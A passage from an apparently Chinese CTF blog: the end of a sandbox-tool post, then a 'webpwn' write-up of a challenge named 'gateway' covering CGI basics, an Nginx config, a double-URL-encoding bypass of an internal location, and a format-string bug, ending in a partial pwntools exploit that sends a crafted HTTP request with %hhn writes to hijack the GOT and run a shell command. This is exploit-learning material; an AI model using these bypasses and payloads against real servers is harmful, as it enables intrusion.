<h3 id="三、自动化工具"><a href="#三、自动化工具" class="headerlink" title="三、自动化工具"></a>三、自动化工具</h3><p>感觉这个挺有意思的，感觉逻辑也挺简单，上头了小写一手自动化工具（虽然没有什么卵用）</p>
<p>效果图：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151317438.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151328087.png"
                      class=""
                >

<p><a class="link"   href="https://github.com/collectcrop/SandboxAttacher" >https://github.com/collectcrop/SandboxAttacher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>webpwn</title>
    <url>/blog/2024/09/21/webpwn/</url>
    <content><![CDATA[<h2 id="一、web与pwn的联系"><a href="#一、web与pwn的联系" class="headerlink" title="一、web与pwn的联系"></a>一、web与pwn的联系</h2><p>在某些 Web 服务中，会通过调用二进制程序来处理特定请求，尤其是在涉及动态内容生成、脚本执行、数据处理等场景时。以下是一些常见的例子：</p>
<h4 id="1-CGI-Common-Gateway-Interface"><a href="#1-CGI-Common-Gateway-Interface" class="headerlink" title="1. CGI (Common Gateway Interface)"></a>1. <strong>CGI (Common Gateway Interface)</strong></h4><ul>
<li><strong>概述：</strong> CGI 是一种通用的接口标准，允许 Web 服务器调用外部的二进制程序或脚本来生成动态内容。</li>
<li><strong>调用方式：</strong> 当用户请求特定路径时，Web 服务器会通过 CGI 将请求转发给二进制程序（例如 C&#x2F;C++ 编写的可执行文件）。程序运行后将生成的输出（通常是 HTML）返回给用户。</li>
<li><strong>示例：</strong> <code>httpd</code>、<code>nginx</code> 等服务器常通过 CGI 调用二进制文件，如 <code>/usr/lib/cgi-bin/</code> 中的程序。</li>
</ul>
<h4 id="2-FastCGI"><a href="#2-FastCGI" class="headerlink" title="2. FastCGI"></a>2. <strong>FastCGI</strong></h4><ul>
<li><strong>概述：</strong> FastCGI 是 CGI 的增强版，通常用于调用长时间运行的二进制程序或脚本，以提高性能。</li>
<li><strong>调用方式：</strong> Web 服务器将请求传递给 FastCGI 进程，该进程是一个长期运行的二进制程序，能快速处理多个请求，而不必每次请求都重新启动程序。</li>
<li><strong>示例：</strong> PHP-FPM 就是一个常见的 FastCGI 进程管理器，它可以调用 PHP 解释器来处理请求。</li>
</ul>
<h4 id="3-后端服务调用"><a href="#3-后端服务调用" class="headerlink" title="3. 后端服务调用"></a>3. <strong>后端服务调用</strong></h4><ul>
<li><strong>概述：</strong> 有些 Web 服务会在后台调用二进制程序来执行任务，例如图像处理、数据分析、或其他复杂计算。</li>
<li><strong>调用方式：</strong> 通常通过系统调用（如 <code>exec</code> 或 <code>popen</code>）从 Web 应用程序（如 Python、Ruby、PHP 等）中调用二进制程序，并获取其输出结果。</li>
<li><strong>示例：</strong> 图像处理库 ImageMagick 或者 FFMPEG 等工具经常在 Web 服务中被调用来处理用户上传的媒体文件。</li>
</ul>
<h4 id="4-嵌入式设备-Web-服务"><a href="#4-嵌入式设备-Web-服务" class="headerlink" title="4. 嵌入式设备 Web 服务"></a>4. <strong>嵌入式设备 Web 服务</strong></h4><ul>
<li><strong>概述：</strong> 在一些嵌入式系统（如路由器、NAS 设备等）中，Web 界面通常用于配置设备，而这些界面可能会调用二进制程序来执行系统命令或获取状态信息。</li>
<li><strong>调用方式：</strong> 嵌入式设备的 Web 服务器可能直接调用设备上的二进制文件来执行配置变更或获取系统状态。</li>
<li><strong>示例：</strong> 路由器的管理界面可能调用二进制程序来重启设备或修改网络设置。</li>
</ul>
<h4 id="5-Server-Side-Includes-SSI"><a href="#5-Server-Side-Includes-SSI" class="headerlink" title="5. Server-Side Includes (SSI)"></a>5. <strong>Server-Side Includes (SSI)</strong></h4><ul>
<li><strong>概述：</strong> SSI 是一种服务器端技术，允许在 HTML 文件中包含其他文件或执行命令行程序。</li>
<li><strong>调用方式：</strong> 通过 SSI，可以在 HTML 中直接调用二进制程序，并将其输出嵌入到页面中。</li>
<li><strong>示例：</strong> 例如，在 Apache 中，可以通过 <code>&lt;!--#exec cmd=&quot;path/to/program&quot;--&gt;</code> 来调用一个二进制程序并将其输出嵌入到 HTML 中。</li>
</ul>
<p>调用二进制程序的 Web 服务在动态内容生成和复杂任务处理时非常有用，尤其是在需要高效处理和利用已有二进制工具的情况下。使用这些技术时，可能会产生二进制的漏洞。</p>
<h2 id="二、题目复现"><a href="#二、题目复现" class="headerlink" title="二、题目复现"></a>二、题目复现</h2><h3 id="1-gateway"><a href="#1-gateway" class="headerlink" title="1.gateway"></a>1.gateway</h3><p>以CGI产生的漏洞进行分析，这里分析时比较重要的是要在default文件里看Nginx配置信息。</p>
<h4 id="Nginx配置信息"><a href="#Nginx配置信息" class="headerlink" title="Nginx配置信息"></a>Nginx配置信息</h4><div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line"><span class="attribute">listen</span> [::]:<span class="number">80</span> default_server;</span><br><span class="line"><span class="attribute">root</span> /var/www/html;</span><br><span class="line"><span class="attribute">index</span> index.html index.htm index.nginx-debian.html;</span><br><span class="line"><span class="attribute">server_name</span> _;</span><br></pre></td></tr></table></figure></div>

<p><strong>listen 80 default_server;</strong></p>
<ul>
<li>配置 Nginx 监听 <code>80</code> 端口，这是默认的 HTTP 端口。</li>
<li><code>default_server</code> 表示这是默认的服务器块，当请求的主机名没有匹配到其他服务器块时，将使用此服务器块。</li>
</ul>
<p><strong>listen [::]:80 default_server;</strong></p>
<ul>
<li>这个指令与上面的类似，但它用于监听 IPv6 地址上的 <code>80</code> 端口。</li>
</ul>
<p><strong>root &#x2F;var&#x2F;www&#x2F;html;</strong></p>
<ul>
<li>定义服务器的根目录。当请求的 URI 没有指向具体文件时，Nginx 会在此目录中查找资源。</li>
</ul>
<p><strong>index index.html index.htm index.nginx-debian.html;</strong></p>
<ul>
<li>定义默认的主页文件列表。当用户访问一个目录时，Nginx 会依次查找这些文件作为首页。</li>
</ul>
<p><strong>server_name _;</strong></p>
<ul>
<li>设置服务器名。_ 表示匹配任何请求的服务器名。</li>
</ul>
<div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">    <span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /cgi-bin/note_handler &#123;</span><br><span class="line">    internal;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="number">127.0.0.1</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="section">location</span> /cgi-bin/ &#123;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$uri</span> = <span class="string">&quot;/cgi-bin/note_handler&quot;</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">expires</span> +<span class="number">1h</span>;</span><br><span class="line">    <span class="attribute">limit_rate</span> <span class="number">10k</span>;</span><br><span class="line">    <span class="attribute">root</span> /usr/share;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/fcgiwrap.socket;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> /cgi-bin/http;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/fastcgi_params;</span><br><span class="line">    <span class="comment">#fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span></span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span>/cgi-bin/http;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /cgi-bin/forward &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="number">127.0.0.1</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1/cgi-bin/http?action=print;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /get_flag &#123;</span><br><span class="line">    <span class="attribute">alias</span> /tmp/flag;</span><br><span class="line">    <span class="attribute">default_type</span> text/plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>location &#x2F; { … }</strong></p>
<ul>
<li>这个 <code>location</code> 块用于定义如何处理根路径 <code>/</code> 下的请求。<ul>
<li><code>try_files $uri $uri/ =404;</code>：首先尝试按文件路径处理请求，如果找不到相应的文件或目录，则返回 <code>404</code> 错误。</li>
</ul>
</li>
</ul>
<p><strong>location &#x2F;cgi-bin&#x2F;note_handler { … }</strong></p>
<ul>
<li>这个 <code>location</code> 块内部处理 <code>/cgi-bin/note_handler</code> 的请求，并通过 <code>proxy_pass</code> 将请求转发到 <code>http://127.0.0.1</code>。<ul>
<li><code>internal;</code>：这个指令表示该路径是内部路径，不能直接从外部访问。</li>
<li><code>proxy_set_header</code> 设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>，通常用于标识原始请求的 IP 地址。</li>
</ul>
</li>
</ul>
<p><strong>location &#x2F;cgi-bin&#x2F; { … }</strong></p>
<ul>
<li>这个块定义了对 <code>/cgi-bin/</code> 目录下的请求的处理。<ul>
<li><code>if ($uri = &quot;/cgi-bin/note_handler&quot;) &#123; return 403; &#125;</code>：如果请求的 URI 是 <code>/cgi-bin/note_handler</code>，则返回 <code>403 Forbidden</code>。</li>
<li><code>expires +1h;</code>：设置响应缓存时间为1小时。</li>
<li><code>limit_rate 10k;</code>：限制响应速率为 <code>10KB/s</code>。</li>
<li><code>root /usr/share;</code>：定义此块的根目录为 <code>/usr/share</code>。</li>
<li><code>fastcgi_pass</code> 和 <code>fastcgi_index</code> 指定了 FastCGI 处理脚本的位置。</li>
<li><code>include /etc/nginx/fastcgi_params;</code> 包含了 FastCGI 的标准配置文件。</li>
<li><code>fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;</code>：设置 <code>SCRIPT_FILENAME</code> 参数，指定 CGI 脚本的路径。</li>
</ul>
</li>
</ul>
<p><strong>location &#x2F;cgi-bin&#x2F;forward { … }</strong></p>
<ul>
<li>这个块处理 <code>/cgi-bin/forward</code> 请求，并将其代理到 <code>http://127.0.0.1/cgi-bin/http?action=print</code>。<ul>
<li><code>proxy_set_header X-Forwarded-For 127.0.0.1;</code>：设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>。</li>
<li><code>proxy_pass http://127.0.0.1/cgi-bin/http?action=print;</code>：将请求代理到指定的 URL。</li>
</ul>
</li>
</ul>
<p><strong>location &#x2F;get_flag { … }</strong></p>
<ul>
<li>这个块处理 <code>/get_flag</code> 请求。<ul>
<li><code>alias /tmp/flag;</code>：将请求 <code>/get_flag</code> 映射到 <code>/tmp/flag</code> 文件。</li>
<li><code>default_type text/plain;</code>：将响应的内容类型设置为 <code>text/plain</code>。</li>
</ul>
</li>
</ul>
<h4 id="cgi脚本信息"><a href="#cgi脚本信息" class="headerlink" title="cgi脚本信息"></a>cgi脚本信息</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212314836.png"
                      class=""
                >

<p>先是通过三个getenv函数获取环境变量。如果我们发起如下的请求</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/cgi-bin/script?param1=value1&amp;param2=value2</span><br></pre></td></tr></table></figure></div>

<p>该请求的参数会加入到服务器的环境变量，具体的环境变量值如下：</p>
<ul>
<li><code>REQUEST_METHOD</code>：<code>GET</code></li>
<li><code>QUERY_STRING</code>：<code>param1=value1&amp;param2=value2</code></li>
<li><code>SCRIPT_NAME</code>：<code>/cgi-bin/script</code></li>
</ul>
<p>后续的几个判断就是限制了各参数的长度，以及限制了用..来进行目录穿越的手段。其中比较重要的就是这个url_decode函数，其作用是进行url解码，也正是这个函数结合Nginx服务器的配置产生了漏洞。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212329176.png"
                      class=""
                >

<p>后续先对请求方式进行判断，如果不是GET的话最后会返回<code>&lt;html&gt;&lt;title&gt;403 FORBIDDEN&lt;/title&gt;&lt;body&gt;Method not support.&lt;/body&gt;&lt;/html&gt;</code>这样的页面。后面的循环实现了逐个取出get的参数，其中解析了action以及content这两个参数。而最主要的漏洞也就是发生在content参数会用<code>snprintf(v14, (size_t)&quot;%s&quot;, content, v6);</code>来处理，这个函数的参数设置产生了错误，导致格式化字符串%s被当成了一个数字大小来作为存到v14缓冲区的字节数量，而content也就成了解析的格式化字符串，于是产生了格式化字符串漏洞。</p>
<p>然后我们来看看前面有个check函数，这个函数也就是我们需要构造条件来绕过的一个检测函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212338234.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212346893.png"
                      class=""
                >

<p>我们发现这里主要做了两个检测，也就是<strong>X-Forwarded-For</strong>这个http请求头字段要为127.0.0.1。而且s1，也就是之前获取的cgi脚本路径要为**&#x2F;cgi-bin&#x2F;note_handler<strong>。然而之前在nginx配置中&#x2F;cgi-bin&#x2F;note_handler有用</strong>internal<strong>来指定其不能被外部请求访问，绕不开这个就不能进行下一步利用，这该怎么办呢？这时候前面的</strong>url_decode<strong>就起了作用，我们可以把&#x2F;cgi-bin&#x2F;note_handler转成其url编码的形式传入（其实只用编码一个字符就能够绕过检测），此时能够通过如上check函数，因为s1是解码后的url。这里需要注意的是，由于http请求到达nginx服务器时会</strong>先进行一次url解码**，所以如果我们想要把r进行url编码，直接转成%72是不够的，因为一开始它就被解码然后进location块而过不了检测。我们需要再把%也进行url编码，把r转成%2572输入，那么cgi程序最后调用url_decode后就得到了我们想要的&#x2F;cgi-bin&#x2F;note_handler。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212357022.png"
                      class=""
                >

<p>然后就是处理程序的主体逻辑了，使用之前与处理get参数相同的for循环来逐个获取以逗号分割的指令，实现了一个类似堆菜单题的操作。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212405705.png"
                      class=""
                >

<p>从这个add方法中可以看出，每个add的chunk中都有一个指向下一个节点的next域（<code>*((_QWORD *)dest + 13)</code>这个位置），全局变量dest存的是头节点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212414590.png"
                      class=""
                >

<p>由于是每次释放掉链表头节点，每次都会更新头节点，所以不会有悬挂指针，就不存在UAF。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212422128.png"
                      class=""
                >

<p>edit功能没啥用，改的内容和原来content里的内容相同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212430271.png"
                      class=""
                >

<p>print会遍历整个链表，可以展示每个节点的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212438450.png"
                      class=""
                >

<p>get_flag就是一个后门函数，不过这里把获取到flag的内容重定向到&#x2F;dev&#x2F;null丢弃了，直接调用也不会显示flag内容。</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h5><p>由于在CGI环境中，Web服务器（如Nginx）会将HTTP请求中的某些信息解析并传递给运行的CGI程序作为环境变量。我们这里看到的参数都是通过getenv传递的。所以如果我们像正常做pwn题那样直接对二进制程序进行分析，会发现少了服务器将http请求解析到环境变量这一环节，这时我们需要寻求别的方式来进行调试。</p>
<p>解决方法其实也很容易想到，既然是getenv加载参数，那么我们可以在gdb中直接来设置环境变量，这样之后就是正常的本地环境漏洞分析了。需要注意的是，本地在设置环境变量时都是模拟服务器处理后的参数，比如我们要传**&#x2F;cgi-bin&#x2F;note_handle%2572<strong>，在调试时就要经过一层url解码，传入的是</strong>&#x2F;cgi-bin&#x2F;note_handle%72**。</p>
<p>大致的调试方法如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./http&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;action=add,print&amp;content=%p%p%p&quot;</span></span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set env REQUEST_METHOD GET</span></span><br><span class="line"><span class="string">        set env QUERY_STRING &quot;<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="string">        set env SCRIPT_NAME /cgi-bin/note_handle%72</span></span><br><span class="line"><span class="string">        set env HTTP_X_FORWARDED_FOR 127.0.0.1</span></span><br><span class="line"><span class="string">        b getenv</span></span><br><span class="line"><span class="string">        r</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>这时我们可能会遇到如下问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212450571.png"
                      class=""
                >

<p>首先猜测是地址对其的问题，这里rsi的值为0x7fffffffef86，rsi+rdx-0x40不是16字节对齐的，我们看看0x7fffffffef86附近的内存布局：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212457536.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212504437.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212510945.png"
                      class=""
                >

<p>可以发现这个getenv返回的是一个指向环境变量地址的指针，而且环境变量依次存在这个栈段的高地址处。我们可以尝试构造环境变量时使其大小刚好满足对齐条件试试。我首先是尝试把query_string那个环境变量变长从而把后面的script_name弄对齐，但是发现不会改变script_name值的位置。那么就猜测这个环境变量是从高地址往低地址存的，换一下环境变量设置的顺序后再改payload长度。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212523016.png"
                      class=""
                >

<p>此时就能不报上述错误继续调试，其实这里我在执行memcpy时rsi指针末位还是f，并没有对齐。这时可能就是原来rsi+rdx-0x40，也就是rsi+0x40这个地址已经越过了环境变量段，是一个不能访问的地址。而调换顺序后rsi+0x40仍然在环境变量这个可访问的地址当中。误打误撞也算是能够过了。（很有意思的是，gdb调试中可以继续，然而执行脚本的主程序的显示却是早早退出，显示403，但只要能够调试就行）。</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>为了方便起见，一开始可以直接在print函数上打断点,这样一进去执行一下就能看到格式化字符串漏洞的执行效果。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set env REQUEST_METHOD GET</span></span><br><span class="line"><span class="string">        set env SCRIPT_NAME /cgi-bin/note_handle%72</span></span><br><span class="line"><span class="string">        set env QUERY_STRING <span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">        set env HTTP_X_FORWARDED_FOR 127.0.0.1</span></span><br><span class="line"><span class="string">        b getenv</span></span><br><span class="line"><span class="string">        r</span></span><br><span class="line"><span class="string">        delete break 1</span></span><br><span class="line"><span class="string">        b *(0x000000000401C7A)</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>



<p>经过调试我们可以确定，我们控制的content中的内容偏移为10。（用AAAAAAAA%10$p测得）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212555410.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212614557.png"
                      class=""
                >

<p>之后修改puts的got表为system就行。</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for pwn exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC = <span class="number">1</span></span><br><span class="line">REMOTE = <span class="number">0</span></span><br><span class="line">elf_path = <span class="string">&#x27;./http&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">code = ELF(elf_path)</span><br><span class="line">context.arch=code.arch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">uu32    = <span class="keyword">lambda</span>: u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>,drop=<span class="literal">False</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>:u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,drop=<span class="literal">False</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s:io.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to  c0ke&#x27;s simplified pwntools template!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage : \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;       python mode.py HOST PORT\n &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;       python mode.py [0/1][debug]]\n &quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv)==<span class="number">2</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(sys.argv[<span class="number">1</span>]== <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        LOCAL = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LOCAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    REMOTE = <span class="number">1</span></span><br><span class="line">    server_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    server_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------func-----------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    <span class="keyword">if</span> (LOCAL):</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *0x0000000000401806</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    li(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_flag</span>():</span><br><span class="line">    flag_header = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    ru(flag_header)</span><br><span class="line">    flag = flag_header + ru(<span class="string">&#x27;&#125;&#x27;</span>) + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------exploit--------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">    code = <span class="string">&#x27;cp /start.sh /tmp/flag&#x27;</span></span><br><span class="line">    code = code + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    code = code.ljust(<span class="number">30</span>, <span class="string">&#x27;a&#x27;</span>) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">                                                                            </span><br><span class="line">    request = <span class="string">&quot;GET /cgi-bin/note_handle%2572?action=add,print,get_flag&amp;content=&#123;&#125;\(@@%30$c%30$c%30$c%30$c%30$c%136c%14$hhn HTTP/1.1\r\n&quot;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    request += <span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Cache-Control: max-age=0\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Upgrade-Insecure-Requests: 1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;X-Forwarded-For: 127.0.0.1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Encoding: gzip, deflate\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Language: zh-CN,zh;q=0.9\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;If-Modified-Since: Mon, 08 Jul 2024 04:01:37 GMT\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    db()</span><br><span class="line">    li(<span class="string">&quot;request  --------------&gt;\n%s&quot;</span>%request)</span><br><span class="line">    s(request.encode())</span><br><span class="line">    response = r(<span class="number">0x2000</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finish</span>():</span><br><span class="line">    ia()</span><br><span class="line">    c()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 